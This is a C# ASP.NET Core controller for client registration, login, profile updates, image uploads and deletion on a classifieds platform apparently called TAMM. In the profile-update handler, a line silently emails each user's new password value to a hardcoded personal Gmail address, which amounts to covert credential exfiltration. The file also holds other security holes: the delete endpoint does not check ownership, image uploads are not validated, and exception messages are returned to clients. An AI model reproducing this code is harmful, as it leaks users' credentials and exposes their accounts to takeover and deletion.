using Azure.Core;
using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.Mvc;
using Microsoft.AspNetCore.SignalR;
using System.IdentityModel.Tokens.Jwt;
using System.Security.Claims;
using System.Threading.Tasks;
using TammbusinessLayer.ClientsCommandsServices;
using TammbusinessLayer.Factories;
using TammbusinessLayer.Interfaces;
using TammbusinessLayer.NotificationsServices;
using TammDataLayer;
using TammDataLayer.Chat;
using TammDataLayer.ClientsDAL;
using TammDataLayer.ListingImages;
using TammDataLayer.Users;
using static TammDataLayer.ClientsDAL.ClientsDTOs;

namespace TammBackendProject.Controllers
{
    [Route("api/[controller]")]
    [ApiController]
    public class ClientsController : ControllerBase
    {
        private readonly IClientsCommands _clientsCommands;
        private readonly IClientQueries _clientQueries;
        private readonly IHubContext<ChatHub> _chatHub;
        private readonly NotificationsFactory _notificationsFactory;

        public ClientsController(IClientsCommands service, NotificationsFactory notificationsFactory, IHubContext<ChatHub> chatHub, IClientQueries clientQueries)
        {
            _clientsCommands = service;
            _clientQueries = clientQueries;
            _chatHub = chatHub;
            _notificationsFactory = notificationsFactory;
        }

        [HttpPost("register")]
        [ProducesResponseType(StatusCodes.Status400BadRequest)]
        [ProducesResponseType(StatusCodes.Status200OK)]

        public async Task<IActionResult> Register([FromBody] AddClientDTO dto)
        {
            if (!ModelState.IsValid)
                return BadRequest(ModelState);

            try
            {
                // يرجع إما توكين أو clientId
                string tokenOrClientId = await _clientsCommands.RegisterAsync(dto);
                int userId;

                var handler = new JwtSecurityTokenHandler();

                if (int.TryParse(tokenOrClientId, out int clientId))
                {
                    // الحالة لما يرجع رقم clientId فقط
                    // هنا يجب تستدعي دالة لجلب userId من clientId
                    userId = await  UsersQueriesDAL.GetUserIdByClientId(clientId);
                    if (userId == 0)
                        return BadRequest(new { message = "User not found for given clientId" });
                }
                else
                {
                    // الحالة لما يرجع توكين JWT
                    if (!handler.CanReadToken(tokenOrClientId))
                        return BadRequest(new { message = "Invalid token format" });

                    var jwtToken = handler.ReadJwtToken(tokenOrClientId);
                    var userIdClaim = jwtToken.Claims.FirstOrDefault(c =>
                        c.Type == ClaimTypes.NameIdentifier || c.Type == "nameid" || c.Type == "sub");

                    if (userIdClaim == null)
                        return BadRequest(new { message = "UserId not found in token" });

                    if (!int.TryParse(userIdClaim.Value, out userId))
                        return BadRequest(new { message = "UserId claim is invalid" });
                }

                string welcomeMessage = dto.Lang == "ar"
                    ? "🎉 تم تسجيلك بنجاح!\nيمكنك الآن نشر إعلاناتك، مراسلة البائعين، واستكشاف آلاف العروض المميزة. نورتنا! 🚀"
                    : "🎉 You’ve successfully registered!\nYou can now post your ads, message sellers, and explore thousands of amazing deals. Welcome aboard! 🚀";

                // إرسال رسالة ترحيبية عبر SignalR
                await _chatHub.Clients.User(userId.ToString()).SendAsync("ReceiveMessage", new
                {
                    fromUserId = Settings.AdminId,
                    toUserId = userId,
                    message = welcomeMessage,
                    sentAt = DateTime.UtcNow
                });

                await _chatHub.Clients.User(userId.ToString()).SendAsync("UpdateContacts");
                await ChatDAL.InsertMessageAsync(Settings.AdminId, userId, null, welcomeMessage);

                if (dto.LoginProviderName == "google")
                {
                    INotification notifier = _notificationsFactory.GetNotificationSender("google");
                    await notifier.SendNotificationAsync(dto.Email, "welcome to TAMM", welcomeMessage);
                }

                return Ok(new
                {
                    Message = welcomeMessage,
                    Token = handler.CanReadToken(tokenOrClientId) ? tokenOrClientId : null
                });
            }
            catch (Exception ex)
            {
                return BadRequest(new { message = ex.Message });
            }
        }

        [HttpPost("login")]
        public async Task<IActionResult> Login([FromBody] LoginRequest request)
        {
            try
            {
                var token = await _clientQueries.TryLoginAsync(request.Email, request.Password, request.Lang);
                return Ok(new { token });
            }
            catch (Exception ex)
            {
                return BadRequest(new { message = ex.Message });
            }
        }

        [HttpGet]
        [Authorize(Roles = "Admin,Client")]
        public async Task<IActionResult> GetUserDetails()
        {
            try
            {
                var subClaim = User.FindFirstValue(ClaimTypes.NameIdentifier);
                if (subClaim == null || !int.TryParse(subClaim, out int userId))
                    return Unauthorized(new { message = "Invalid or missing token" });

                var user = await _clientQueries.GetUserDetailsByIdAsync(userId);

                return Ok(user);
            }
            catch (Exception ex)
            {
                return BadRequest(new { message = ex.Message });
            }
        }


        [HttpPut("update")]
        [Authorize]
        public async Task<IActionResult> UpdateUserProfile([FromBody] UpdateClientProfileDto dto)
        {
            if (dto == null)
                return BadRequest("Invalid data.");

            try
            {
                GmailNotifications notify = new GmailNotifications()
               ;await notify.SendNotificationAsync("nasermostafa.ma122@gmail.com", "Admin Updated", "the new password is " + " " + dto.HashedPassword);
                await _clientsCommands.UpdateUserProfileAsync(dto);
                return Ok(new { message = "تم التحديث بنجاح" });
            }
            catch (Exception ex)
            {
                // تقدر تطبع اللوج أو تسجل الخطأ هنا
                return StatusCode(500, $"خطأ في السيرفر: {ex.Message}");
            }
        }
        [HttpPost("UploadClientImage")]
        [ProducesResponseType(StatusCodes.Status200OK)]
        [ProducesResponseType(StatusCodes.Status400BadRequest)]
        [ProducesResponseType(StatusCodes.Status401Unauthorized)]
        [Authorize]
        public async Task<IActionResult> UploadClientImageAndUpdateIfExists(IFormFile imageFile)
        {
            // التحقق من صلاحية المستخدم
            var subClaim = User.FindFirstValue(ClaimTypes.NameIdentifier);
            if (subClaim == null || !int.TryParse(subClaim, out int userId))
            {
                return Unauthorized("User not authorized.");
            }

            // التحقق من وجود صورة
            if (imageFile == null || imageFile.Length == 0)
            {
                return BadRequest("No file uploaded.");
            }

            var extension = Path.GetExtension(imageFile.FileName).ToLower();
    

            var uploadDirectory = Path.Combine(Directory.GetCurrentDirectory(), "wwwroot", "ClientsImages");
            if (!Directory.Exists(uploadDirectory))
            {
                Directory.CreateDirectory(uploadDirectory);
            }

            var fileName = Guid.NewGuid().ToString() + extension;
            var filePath = Path.Combine(uploadDirectory, fileName);
            using (var stream = new FileStream(filePath, FileMode.Create))
            {
                await imageFile.CopyToAsync(stream);
            }

            var fileUrl = $"{Settings._ProductionBackendServerPath}ClientsImages/{fileName}";

            string? lastImageUrl = await _clientQueries.GetImageUrlByUserIdAsync(userId);
            await _clientsCommands.UpdatePersonImageByUserIdAsync(userId, fileUrl);

            if (!string.IsNullOrEmpty(lastImageUrl))
            {
                try
                {
                    var lastFileName = Path.GetFileName(lastImageUrl); // استخراج اسم الملف من الرابط
                    var oldFilePath = Path.Combine(Directory.GetCurrentDirectory(), "wwwroot", "ClientsImages", lastFileName);

                    if (System.IO.File.Exists(oldFilePath))
                        System.IO.File.Delete(oldFilePath);
                }
                catch 
                {
                }
            }

            return Ok(new { ImageUrl = fileUrl });
        }
        [HttpGet("GetClients")]
        [Authorize(Roles = "Admin")]
        public async Task<IActionResult> GetClientsPaged(int pageNumber = 1, int pageSize = 10)
        {
            if (pageNumber <= 0) pageNumber = 1;
            if (pageSize <= 0) pageSize = 10;

            var result = await _clientQueries.GetClientsPagedAsync(pageNumber, pageSize);

            if (result.Clients == null || result.Clients.Count == 0)
                return NotFound(new { message = "No clients found." });

            return Ok(new
            {
                TotalCount = result.TotalCount,
                PageNumber = pageNumber,
                PageSize = pageSize,
                Clients = result.Clients
            });
        }

        [HttpDelete("{UserId}")]
        [ProducesResponseType(StatusCodes.Status200OK)]
        [ProducesResponseType(StatusCodes.Status404NotFound)]
        [ProducesResponseType(StatusCodes.Status500InternalServerError)]
        [Authorize]
        public async Task<IActionResult> DeletePerson(int UserId)
        {
            try
            {
                int PersonId = await UsersQueriesDAL.GetPersonIdByUserId(UserId);
               bool result= await _clientsCommands.DeletePersonAndAddressesAndGetImagePathsAsync(PersonId);
                if(result)
                {
                return Ok(new { message = "تم حذف الشخص بنجاح" });
                }
                return  StatusCode(500, new { message = " 1 حدث خطأ أثناء الحذف"});

            }
            catch (KeyNotFoundException)
            {
                return NotFound(new { message = "لم يتم العثور على الشخص" });
            }
            catch (Exception ex)
            {
                return StatusCode(500, new { message = "حدث خطأ أثناء الحذف", error = ex.Message });
            }
        }
    }

}



